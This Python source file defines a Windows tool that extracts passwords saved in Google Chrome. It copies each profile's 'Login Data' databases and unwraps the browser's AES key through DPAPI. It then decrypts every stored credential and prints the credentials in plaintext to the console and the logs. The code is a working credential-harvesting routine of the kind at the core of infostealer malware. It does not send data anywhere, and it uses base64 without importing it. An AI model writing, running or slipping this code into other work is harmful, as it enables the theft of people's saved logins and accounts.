import os
import sys
import logging
import sqlite3
import shutil
import csv
import secrets
import hashlib
import json
from pathlib import Path
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta

class ChromePasswordExtractor:
    def __init__(self, output_file=None, verbose=False):
        if sys.platform != 'win32':
            logging.error("This script is designed for Windows only.")
            raise RuntimeError("This script is designed for Windows only.")
        self.base_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
        self.output_file = output_file
        if verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        self.key = None

    def get_chrome_datetime(self, chromedate):
        if chromedate is None or chromedate == 86400000000:
            return None
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except (OverflowError, ValueError) as e:
            logging.warning(f"Invalid timestamp {chromedate}: {e}")
            return None

    def get_encryption_key(self):
        if self.key:
            return self.key
        local_state_path = os.path.join(self.base_path, "Local State")
        try:
            if not os.path.exists(local_state_path):
                raise FileNotFoundError(f"Local State file not found at {local_state_path}")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = encrypted_key[5:]
            self.key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            logging.info("Encryption key retrieved successfully.")
            return self.key
        except Exception as e:
            logging.error(f"Failed to retrieve encryption key: {e}")
            sys.exit(1)

    def decrypt_password(self, password, key):
        if not password:
            return ""
        try:
            iv = password[3:15]
            ciphertext = password[15:]
            if len(iv) != 12 or len(ciphertext) < 16:
                raise ValueError("Invalid encrypted password format")
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='replace')
            return decrypted
        except Exception as e:
            logging.debug(f"AES decryption failed: {e}, attempting DPAPI fallback.")
            try:
                return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8', errors='replace')
            except Exception as e:
                logging.warning(f"Password decryption failed: {e}")
                return ""

    def get_profiles(self):
        profiles = ['Default']
        profile_dir = Path(self.base_path)
        if not profile_dir.exists():
            logging.error(f"Chrome User Data directory not found: {self.base_path}")
            sys.exit(1)
        try:
            for item in profile_dir.glob("Profile *"):
                if item.is_dir():
                    profiles.append(item.name)
            logging.debug(f"Detected profiles: {profiles}")
            return profiles
        except Exception as e:
            logging.error(f"Failed to retrieve profiles: {e}")
            return ['Default']

    def secure_delete(self, filepath):
        try:
            if not os.path.exists(filepath):
                return
            file_size = os.path.getsize(filepath)
            with open(filepath, "wb") as f:
                f.write(secrets.token_bytes(file_size))
            os.remove(filepath)
            logging.debug(f"Securely deleted {filepath}")
        except Exception as e:
            logging.warning(f"Failed to securely delete {filepath}: {e}")

    def extract_passwords(self, profile, db_type="Login Data"):
        db_path = os.path.join(self.base_path, profile, db_type)
        temp_db = f"ChromeData_{profile}{db_type.replace(' ', '')}_{secrets.token_hex(4)}.db"

        if not os.path.exists(db_path):
            logging.warning(f"{db_type} not found for profile: {profile}")
            return []

        conn = None
        try:
            logging.debug(f"Copying {db_path} to temporary file {temp_db}")
            shutil.copyfile(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()

            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
            if not cursor.fetchone():
                logging.warning(f"No 'logins' table found in {db_path}")
                return []

            cursor.execute("SELECT COUNT(*) FROM logins")
            row_count = cursor.fetchone()[0]
            logging.info(f"Found {row_count} rows in 'logins' table for {profile} ({db_type})")
            if row_count > 0:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 1")
                sample = cursor.fetchone()
                decrypted_sample = self.decrypt_password(sample['password_value'], self.get_encryption_key())
                logging.debug(f"Sample row from {profile} ({db_type}): origin_url={sample['origin_url']}, username={sample['username_value']}, password={decrypted_sample}")

            cursor.execute(
                "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created"
            )
            rows = cursor.fetchall()
            key = self.get_encryption_key()
            credentials = []

            for row in rows:
                try:
                    decrypted_password = self.decrypt_password(row['password_value'], key)
                    if not (row['username_value'] or decrypted_password):
                        logging.debug(f"Skipping empty entry in {profile} ({db_type}): {row['origin_url']}")
                        continue
                    cred = {
                        "profile": profile,
                        "db_type": db_type,
                        "origin_url": row['origin_url'],
                        "action_url": row['action_url'],
                        "username": row['username_value'],
                        "password": decrypted_password,
                        "date_created": self.get_chrome_datetime(row['date_created']),
                        "date_last_used": self.get_chrome_datetime(row['date_last_used'])
                    }
                    credentials.append(cred)
                    logging.info(f"Extracted credential: {cred}")
                except Exception as e:
                    logging.warning(f"Error processing row in {profile} ({db_type}): {e}")
            logging.info(f"Extracted {len(credentials)} credentials from {profile} ({db_type})")
            return credentials

        except sqlite3.Error as e:
            logging.error(f"Database error for {profile} ({db_type}): {e}")
            return []
        except Exception as e:
            logging.error(f"Unexpected error extracting passwords from {profile} ({db_type}): {e}")
            return []
        finally:
            if conn:
                conn.close()
            self.secure_delete(temp_db)

    def export_to_csv(self, credentials):
        if not self.output_file:
            return
        try:
            with open(self.output_file, 'w', newline='', encoding='utf-8') as f:
                fieldnames = ['profile', 'db_type', 'origin_url', 'action_url', 'username', 'password_hash', 'date_created', 'date_last_used']
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                for cred in credentials:
                    cred_copy = dict(cred)
                    cred_copy['password_hash'] = hashlib.sha256(cred['password'].encode()).hexdigest() if cred['password'] else ""
                    del cred_copy['password']
                    writer.writerow(cred_copy)
            logging.info(f"Credentials exported to {self.output_file} (passwords hashed)")
        except Exception as e:
            logging.error(f"Failed to export credentials to {self.output_file}: {e}")

    def display_credentials(self, credentials):
        for cred in credentials:
            print(f"Profile: {cred['profile']} ({cred['db_type']})")
            print(f"Origin URL: {cred['origin_url']}")
            print(f"Action URL: {cred['action_url']}")
            print(f"Username: {cred['username']}")
            print(f"Password: {cred['password']}")
            if cred['date_created']:
                print(f"Creation Date: {cred['date_created']}")
            if cred['date_last_used']:
                print(f"Last Used: {cred['date_last_used']}")
            print("=" * 50)

    def run(self):
        logging.info("Starting Chrome password extraction...")
        profiles = self.get_profiles()
        all_credentials = []

        for profile in profiles:
            logging.info(f"Processing profile: {profile}")
            for db_type in ["Login Data", "Login Data For Account"]:
                try:
                    credentials = self.extract_passwords(profile, db_type)
                    all_credentials.extend(credentials)
                except Exception as e:
                    logging.error(f"Failed to process {profile} ({db_type}): {e}")
                    continue

        if not all_credentials:
            logging.warning("No credentials found across all profiles.")
        else:
            for cred in all_credentials:
                logging.info(f"Extracted credential: Profile: {cred['profile']} ({cred['db_type']}), Origin URL: {cred['origin_url']}, Username: {cred['username']}, Password: {cred['password']}, Created: {cred['date_created']}, Last Used: {cred['date_last_used']}")
            self.display_credentials(all_credentials)
            self.export_to_csv(all_credentials)
            logging.info(f"Total credentials extracted: {len(all_credentials)}")
        return all_credentials
